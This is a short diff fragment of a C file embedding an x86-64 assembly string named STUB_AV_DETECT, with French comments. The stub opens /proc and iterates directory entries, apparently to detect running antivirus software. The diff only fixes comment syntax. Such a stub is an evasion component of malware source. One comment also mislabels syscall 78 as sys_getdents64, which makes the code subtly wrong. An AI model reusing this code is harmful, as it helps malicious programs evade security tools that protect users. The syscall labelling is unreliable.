@@ -9,21 +9,21 @@ static const char STUB_AV_DETECT[] =
     //; Ouvrir le répertoire /proc
     "mov rax, 2\n"          //; sys_open
     "mov rdi, proc_path\n"
-    "mov rsi, 0\n"          ; O_RDONLY
+    "mov rsi, 0\n"          //; O_RDONLY
     "syscall\n"
     "cmp rax, 0\n"
     "jl exit_error\n"
-    "mov r12, rax\n"        ; Sauvegarder le fd
+    "mov r12, rax\n"        //; Sauvegarder le fd
 
 "scan_loop:\n"
     //; Lire l'entrée suivante du répertoire
-    "mov rax, 78\n"         ; sys_getdents64
-    "mov rdi, r12\n"        ; fd
-    "mov rsi, buffer\n"     ; buffer
-    "mov rdx, 4096\n"       ; taille buffer
+    "mov rax, 78\n"         //; sys_getdents64
+    "mov rdi, r12\n"        //; fd
+    "mov rsi, buffer\n"     //; buffer
+    "mov rdx, 4096\n"       //; taille buffer
     "syscall\n"
     "cmp rax, 0\n"
-    "jle exit_clean\n"      ; Fin du répertoire
+    "jle exit_clean\n"      //; Fin du répertoire
 
     //; Initialiser les pointeurs
     "mov r13, buffer\n"     //; pointeur vers les entrées
